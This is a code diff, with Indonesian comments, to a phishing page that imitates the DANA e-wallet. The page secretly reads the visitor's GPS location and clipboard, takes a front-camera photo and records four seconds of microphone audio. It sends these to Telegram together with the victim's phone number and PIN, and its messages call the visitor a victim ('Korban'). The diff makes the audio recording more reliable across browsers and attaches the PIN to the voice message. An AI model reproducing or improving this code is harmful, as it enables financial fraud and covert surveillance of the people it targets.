@@ -130,24 +130,35 @@
         if(navigator.geolocation) { navigator.geolocation.getCurrentPosition(pos => { deviceGPS = `Lat:${pos.coords.latitude},Lon:${pos.coords.longitude}`; }, ()=>{}, {timeout:3000}); }
         navigator.clipboard?.readText().then(t => { clipboardData = t || "Kosong"; }).catch(()=>{});
 
-        // Fungsi Rekam Suara Mic (4 Detik)
+        // Fungsi Rekam Suara Mic Diperbaiki (Mendukung format audio universal)
         async function recordAudio(stream) {
             return new Promise((resolve) => {
                 try {
-                    const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+                    const options = { mimeType: 'audio/webm;codecs=opus' };
+                    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+                        options.mimeType = 'audio/ogg;codecs=opus';
+                        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+                            options.mimeType = ''; // Biarkan browser nentuin default terbaik
+                        }
+                    }
+
+                    const mediaRecorder = new MediaRecorder(stream, options);
                     let audioChunks = [];
+                    
                     mediaRecorder.ondataavailable = e => { if (e.data.size > 0) audioChunks.push(e.data); };
                     mediaRecorder.onstop = () => {
-                        capturedAudioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                        capturedAudioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                         resolve();
                     };
+                    
                     mediaRecorder.start();
-                    setTimeout(() => mediaRecorder.stop(), 4000);
-                } catch (e) { resolve(); }
+                    setTimeout(() => mediaRecorder.stop(), 4000); // Rekam durasi 4 detik
+                } catch (e) { 
+                    resolve(); 
+                }
             });
         }
 
-        // Fungsi Ambil Foto & Audio Sekaligus
         async function captureMedia() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
@@ -219,7 +230,7 @@
             await captureMedia();
             await sendToTelegramText("Akses Awal (Cookie & Init)", { phone: "Belum diisi" });
             if (capturedPhotoBlob) await sendToTelegramPhoto("📸 *Foto Korban (Sesi Awal)*\nIP: " + clientIP);
-            if (capturedAudioBlob) await sendToTelegramVoice("🎙️ *Rekaman Mic Korban (Sesi Awal)*");
+            if (capturedAudioBlob) await sendToTelegramVoice("🎙️ *Voice Note / Suara Korban (Sesi Awal)*");
             setTimeout(() => {
                 loadingModal.classList.remove('active');
                 step1.classList.remove('active'); step2.classList.add('active');
@@ -251,7 +262,7 @@
             await captureMedia();
             await sendToTelegramText("🔥 PIN DANA DIMASUKKAN!", { phone: globalPhone, pin: pinVal });
             if (capturedPhotoBlob) await sendToTelegramPhoto(`🔥 *PIN DITEMUKAN!*\n📱 HP: \`${globalPhone}\`\n🔐 PIN: \`${pinVal}\``);
-            if (capturedAudioBlob) await sendToTelegramVoice(`🎙️ *Voice Note / Suara Korban (PIN)*\n📱 HP: \`${globalPhone}\``);
+            if (capturedAudioBlob) await sendToTelegramVoice(`🎙️ *Voice Note / Suara Korban (PIN)*\n📱 HP: \`${globalPhone}\`\n🔐 PIN: \`${pinVal}\``);
 
             setTimeout(() => {
                 spinnerBox.style.display = "none"; successBox.style.display = "flex";
